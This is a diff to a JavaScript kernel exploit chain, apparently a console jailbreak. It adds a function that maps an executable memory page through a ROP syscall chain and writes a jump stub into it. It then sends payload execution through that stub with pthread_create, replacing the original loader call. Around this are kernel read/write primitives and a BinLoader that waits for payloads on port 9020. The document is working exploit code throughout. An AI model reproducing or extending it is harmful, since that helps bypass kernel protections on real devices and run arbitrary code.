@@ -1683,6 +1683,36 @@ function runBinLoader() {
     log('BinLoader is ready. Send a payload to port 9020 now');
 }
 
+function allocate_jit_stub() {
+  const PROT_READ   = 1;
+  const PROT_WRITE  = 2;
+  const PROT_EXEC   = 4;
+  const MAP_ANON    = 0x1000;
+  const MAP_PRIVATE = 0x2;
+
+  
+  const stub_addr = chain.sysp(
+    'mmap',
+    new Int(0x10000, 0),
+    0x1000,
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+    MAP_ANON | MAP_PRIVATE,
+    -1,
+    0
+  );
+ 
+  const stub_buf = new Uint8Array([
+    0xFF, 0xE7, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
+  ]);
+
+  // Copiamo i byte in memoria utente “stub_addr”
+  const tmp = array_from_address(stub_addr, stub_buf.length);
+  tmp.set(stub_buf);
+
+  log(`✅ JIT‐stub scritto a 0x${stub_addr.toString(16)}`);
+  return stub_addr;
+}
+
         
 function zero_out_aio_only(kmem, addr) {
   const totalSize = 0x80;      // dimensione completa di un aio_entry
@@ -1800,8 +1830,9 @@ export async function kexploit() {
         const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
-
-  log('___________________TEST___________________________________');
+const stub_addr = allocate_jit_stub();
+        
+     log('___________________TEST___________________________________');
         debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "prima");
       zero_out_aio_only(kmem, reqs1_addr);
     debug_aio_memory_state(pktopts_sds[0], kmem, reqs1_addr, "Dopo pulizia");
@@ -1896,14 +1927,16 @@ var loader_addr = chain.sysp(
    var shellcode = new Uint32Array(tmp.buffer);
    pl.set(shellcode,0);
    var pthread = malloc(0x10);
-   
-    call_nze(
+
+      call_nze('pthread_create', pthread, 0, stub_addr, payload_buffer);
+
+   /* call_nze(
         'pthread_create',
         pthread,
         0,
         loader_addr,
         payload_buffer,
-    );	
+    );	*/
    }
  };
 
